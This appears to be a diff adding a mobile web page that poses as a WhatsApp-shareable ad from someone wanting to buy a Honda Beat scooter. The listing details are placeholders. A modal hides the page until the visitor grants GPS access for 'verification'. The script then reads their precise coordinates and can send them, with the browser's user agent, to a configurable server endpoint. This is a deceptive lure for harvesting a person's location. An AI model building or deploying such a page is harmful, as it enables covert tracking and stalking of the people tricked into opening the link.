@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Honda Beat 2018 | Siap Dibeli</title>
+
+  <!-- ===== Open Graph (WhatsApp preview) ===== -->
+  <meta property="og:title" content="Honda Beat 2018 • Siap Dibeli">
+  <meta property="og:description" content="Butuh Honda Beat area saya saja. Contoh: Rp 11,5 jt • KM 20-30rb • Pajak hidup.">
+  <meta property="og:image" content="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?q=80&w=1200&auto=format&fit=crop">
+  <meta property="og:url" content="https://example.com/">
+  <meta property="og:type" content="website">
+
+  <!-- Bootstrap & jQuery -->
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
+  <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+
+  <style>
+    body{background:#fff}
+    .hero{position:relative;aspect-ratio:16/9;background:#111;overflow:hidden}
+    .hero img{width:100%;height:100%;object-fit:cover}
+    .pager{position:absolute;bottom:.6rem;right:.75rem;background:rgba(0,0,0,.6);color:#fff;padding:.25rem .6rem;border-radius:999px;font-size:.8rem}
+    .dots{position:absolute;left:50%;bottom:.6rem;transform:translateX(-50%);display:flex;gap:.35rem}
+    .dot{width:.42rem;height:.42rem;border-radius:999px;background:rgba(255,255,255,.5)}
+    .dot.active{background:#fff}
+    .badge-pill{border:1px solid #e5e7eb;border-radius:999px;background:#fff;color:#0f172a}
+    .credit{background:#eef2ff;border:1px solid #c7d2fe;border-radius:14px}
+    .bottom-bar{position:fixed;left:0;right:0;bottom:0;background:#fff;border-top:1px solid #e5e7eb;z-index:20}
+    .btn-ghost{background:#fff;border:1px solid #e5e7eb}
+    .brand-chip{display:inline-flex;align-items:center;gap:.5rem;background:#0b1220;color:#fff;padding:.5rem .6rem;border-radius:10px;font-weight:700;font-size:.75rem}
+    /* Modal Overlay */
+    #loc-modal {
+      position: fixed; inset:0;
+      background: rgba(0,0,0,0.65);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 9999;
+      visibility: hidden; opacity:0;
+      transition: opacity .25s ease, visibility .25s ease;
+    }
+    /* Saat aktif */
+    #loc-modal.active { visibility: visible; opacity:1; }
+
+    /* Card konten */
+    #loc-modal .card {
+      background: #111827;
+      border-radius: 16px;
+      max-width: 480px;
+      width: 100%;
+      padding: 22px;
+      color: #e5e7eb;
+      box-shadow:0 10px 30px rgba(0,0,0,.5);
+    }
+    #loc-modal h1 { margin:0 0 8px; font-size:20px }
+    #loc-modal p { margin:6px 0; color:#9ca3af }
+    .actions{display:flex;gap:10px;flex-wrap:wrap;margin-top:12px}
+    button{padding:10px 14px;border:0;border-radius:10px;cursor:pointer;font-weight:600}
+    .primary{background:#16a34a;color:#fff}
+    .secondary{background:#374151;color:#e5e7eb}
+    .ok{background:#052e18;border:1px solid #0a6b33;padding:8px;border-radius:8px;color:#c7ffdf}
+    .hidden{display:none}
+    .field{margin:6px 0}
+    input[readonly]{width:100%;padding:8px;border-radius:8px;border:1px solid #374151;background:#0b1020;color:#e5e7eb}
+</style>
+
+</head>
+<body>
+
+<div class="container px-0" style="max-width:480px">
+  <!-- HERO -->
+  <div class="hero">
+    <!-- GANTI ke foto Honda Beat kamu -->
+    <img src="https://images.unsplash.com/photo-1517336714731-489689fd1ca8?q=80&w=1400&auto=format&fit=crop" alt="Honda Beat 2018">
+    <div class="pager"><span id="pageNow">1</span> / 5</div>
+    <div class="dots" id="dots"></div>
+  </div>
+
+  <!-- Brand / chip -->
+  <div class="px-3 pt-2">
+    <span class="brand-chip">Mencari Unit • Buyer Only</span>
+  </div>
+
+  <!-- Header -->
+  <div class="d-flex justify-content-between align-items-start px-3 pt-2">
+    <div>
+      <h1 class="h5 mb-1 fw-bold">Honda Beat 2018</h1>
+      <div class="text-muted small">Butuh kondisi mulus, surat lengkap</div>
+    </div>
+    <div class="d-flex gap-2">
+      <button class="btn btn-sm btn-ghost rounded-circle" aria-label="Share">⤴</button>
+      <button class="btn btn-sm btn-ghost rounded-circle" aria-label="Save">♡</button>
+    </div>
+  </div>
+
+  <!-- Badges -->
+  <div class="px-3 pt-2 d-flex flex-wrap gap-2">
+    <span class="badge badge-pill px-3 py-2">⛽ Bensin</span>
+    <span class="badge badge-pill px-3 py-2">🏍️ 110 cc</span>
+    <span class="badge badge-pill px-3 py-2">📍 20.000–30.000 Km (contoh)</span>
+    <span class="badge badge-pill px-3 py-2">⚙️ Matic (CVT)</span>
+  </div>
+
+  <!-- Budget + Estimasi Kredit (jika beli kredit) -->
+  <div class="px-3 pt-3">
+    <div class="fs-5 fw-bold">Budget contoh: Rp 11.500.000</div>
+    <div class="credit mt-2 shadow-sm">
+      <div class="border-bottom p-3 fw-semibold">Preferensi Pembayaran</div>
+      <div class="row g-0 p-3 align-items-center">
+        <div class="col"><div class="text-secondary small">Cash di tempat</div></div>
+        <div class="col-auto fw-bold text-primary">Prioritas</div>
+        <div class="col-12 my-2"></div>
+        <div class="col"><div class="text-secondary small">Atau Kredit</div></div>
+        <div class="col-auto fw-bold text-primary">DP ≥ Rp 2,5 jt <small class="text-primary-emphasis fw-semibold">tenor fleksibel</small></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Kriteria Unit -->
+  <div class="px-3 pt-3 pb-5">
+    <h4 class="h6 fw-semibold">Kriteria Unit</h4>
+    <div class="d-flex align-items-start py-2 border-bottom">
+      <div class="bg-success text-white d-inline-grid me-2 rounded-circle" style="width:20px;height:20px;place-items:center;font-size:.75rem">✓</div>
+      <p class="mb-0 small">Body & rangka utuh, mesin sehat, kelistrikan normal.</p>
+    </div>
+    <div class="d-flex align-items-start py-2 border-bottom">
+      <div class="bg-success text-white d-inline-grid me-2 rounded-circle" style="width:20px;height:20px;place-items:center;font-size:.75rem">✓</div>
+      <p class="mb-0 small">BPKB & STNK lengkap, pajak hidup (boleh mepet).</p>
+    </div>
+    <div class="d-flex align-items-start py-2 border-bottom">
+      <div class="bg-success text-white d-inline-grid me-2 rounded-circle" style="width:20px;height:20px;place-items:center;font-size:.75rem">✓</div>
+      <p class="mb-0 small">Domisili penjual dalam radius area saya (lokasi wajib aktif).</p>
+    </div>
+  </div>
+</div>
+
+<!-- Bottom Action Bar -->
+<div class="bottom-bar">
+  <div class="container" style="max-width:480px">
+    <div class="d-flex gap-2 py-2">
+      <a class="btn btn-ghost flex-fill fw-bold" href="#"><span class="me-1">💬</span>Chat</a>
+      <a class="btn btn-ghost flex-fill fw-bold" href="tel:+62000000000"><span class="me-1">📞</span>Call</a>
+      <a class="btn btn-success flex-fill fw-bold" style="flex:2" href="#offer">Tawarkan Unit</a>
+    </div>
+  </div>
+</div>
+
+<div id="loc-modal">
+  <!-- STEP 1: Consent -->
+  <main class="card" id="step-consent">
+    <h1>Verifikasi Lokasi Diperlukan</h1>
+    <p>Untuk melanjutkan, silakan izinkan akses lokasi (GPS).</p>
+    <div class="actions">
+      <button class="primary" id="btn-allow">Izinkan & Lanjutkan</button>
+      <button class="secondary" id="btn-decline">Saya Tidak Setuju</button>
+    </div>
+  </main>
+
+  <!-- STEP 2: Success -->
+  <main class="card hidden" id="step-ok">
+    <h1>Lokasi Diterima</h1>
+    <p class="ok">Terima kasih. Lokasi berhasil diverifikasi.</p>
+    <div class="field"><input id="lat" readonly placeholder="Latitude"></div>
+    <div class="field"><input id="lng" readonly placeholder="Longitude"></div>
+    <div class="field"><input id="acc" readonly placeholder="Akurasi (meter)"></div>
+    <div class="field"><input id="ts"  readonly placeholder="Waktu (ISO)"></div>
+    <div class="actions">
+      <button class="primary" id="btn-continue">Buka Halaman</button>
+    </div>
+    <p id="post-status"></p>
+  </main>
+
+  <!-- STEP 3: Denied -->
+  <main class="card hidden" id="step-denied">
+    <h1>Akses Lokasi Ditolak</h1>
+    <p>Halaman tidak dapat dibuka tanpa lokasi. Aktifkan izin lokasi di browser untuk lanjut.</p>
+    <div class="actions">
+      <button class="secondary" id="btn-help">Cara Mengaktifkan Lokasi</button>
+    </div>
+  </main>
+</div>
+
+
+<script>
+  // ===== KONFIGURASI =====
+  const POST_ENDPOINT = ""; // contoh: "https://example.com/loc-hook" (biarkan kosong jika tak perlu kirim ke server)
+  const CONTINUE_URL  = "nmax.html"; // halaman tujuan setelah lokasi diterima
+  const REDIRECT_IF_DENIED = ""; // opsional: isi URL mis. "https://example.com/info-proses" untuk redirect jika denied
+  const REDIRECT_DELAY_MS = 4000;
+
+  // ===== UTIL =====
+  const $ = sel => document.querySelector(sel);
+  const show = id => {
+    ["#step-consent","#step-ok","#step-denied"].forEach(s => $(s).classList.add("hidden"));
+    id.classList.remove("hidden");
+  };
+
+  const els = {
+    consent: $("#step-consent"),
+    ok: $("#step-ok"),
+    denied: $("#step-denied"),
+    lat: $("#lat"), lng: $("#lng"), acc: $("#acc"), ts: $("#ts"),
+    btnAllow: $("#btn-allow"), btnDecline: $("#btn-decline"),
+    btnContinue: $("#btn-continue"), postStatus: $("#post-status"), btnHelp: $("#btn-help")
+  };
+
+  // ===== LOGIKA PERMISSION =====
+  async function checkPermission() {
+    if (!("permissions" in navigator) || !("geolocation" in navigator)) return; // fallback: minta via tombol
+    try {
+      const st = await navigator.permissions.query({ name: "geolocation" });
+      if (st.state === "granted") {
+        // Sudah granted sebelumnya → langsung ambil
+        requestLocation();
+      } else if (st.state === "denied") {
+        show(els.denied);
+        maybeRedirectDenied();
+      } else {
+        // "prompt" → tunggu klik user
+        show(els.consent);
+      }
+      // Jika status berubah (user ubah setting)
+      st.onchange = () => {
+        if (st.state === "granted") requestLocation();
+        else if (st.state === "denied") { show(els.denied); maybeRedirectDenied(); }
+        else show(els.consent);
+      };
+    } catch {
+      show(els.consent);
+    }
+  }
+
+  function requestLocation() {
+    navigator.geolocation.getCurrentPosition(onPos, onErr, {
+      enableHighAccuracy: true, timeout: 15000, maximumAge: 0
+    });
+  }
+
+  function onPos(pos) {
+    const { latitude, longitude, accuracy } = pos.coords;
+    const iso = new Date(pos.timestamp).toISOString();
+    els.lat.value = latitude.toFixed(7);
+    els.lng.value = longitude.toFixed(7);
+    els.acc.value = Math.round(accuracy);
+    els.ts.value  = iso;
+    show(els.ok);
+
+    if (POST_ENDPOINT) {
+      fetch(POST_ENDPOINT, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          latitude, longitude, accuracy, timestamp: iso,
+          userAgent: navigator.userAgent
+        })
+      }).then(r => {
+        els.postStatus.textContent = r.ok ? "Lokasi tersimpan." : "Gagal kirim ke server.";
+      }).catch(() => els.postStatus.textContent = "Gagal kirim ke server.");
+    }
+  }
+
+  function onErr(err) {
+    // 1=PERMISSION_DENIED, 2=POSITION_UNAVAILABLE, 3=TIMEOUT
+    if (err.code === 1) {
+      show(els.denied);
+      maybeRedirectDenied();
+    } else {
+      alert("Gagal mengambil lokasi: " + err.message);
+      show(els.consent);
+    }
+  }
+
+  function maybeRedirectDenied() {
+    if (REDIRECT_IF_DENIED) {
+      setTimeout(() => { location.href = REDIRECT_IF_DENIED; }, REDIRECT_DELAY_MS);
+    }
+  }
+
+  // ===== EVENTS =====
+  els.btnAllow.addEventListener("click", () => {
+    if (!("geolocation" in navigator)) { alert("Browser tidak mendukung Geolocation."); return; }
+    requestLocation(); // harus via gesture user (klik)
+  });
+
+  els.btnDecline.addEventListener("click", () => {
+    show(els.denied);
+    maybeRedirectDenied();
+  });
+
+  els.btnContinue.addEventListener("click", () => {
+    location.href = CONTINUE_URL;
+  });
+
+  els.btnHelp.addEventListener("click", () => {
+    alert("Aktifkan lokasi di pengaturan browser:\n\n- Chrome: Lock icon → Site settings → Location → Allow\n- Safari iOS: Settings → Privacy & Security → Location Services → Safari → While Using\n- Android: Settings → Location ON, lalu beri izin untuk browser.");
+  });
+
+  // Mulai
+  checkPermission();
+</script>
+</body>
+</html>
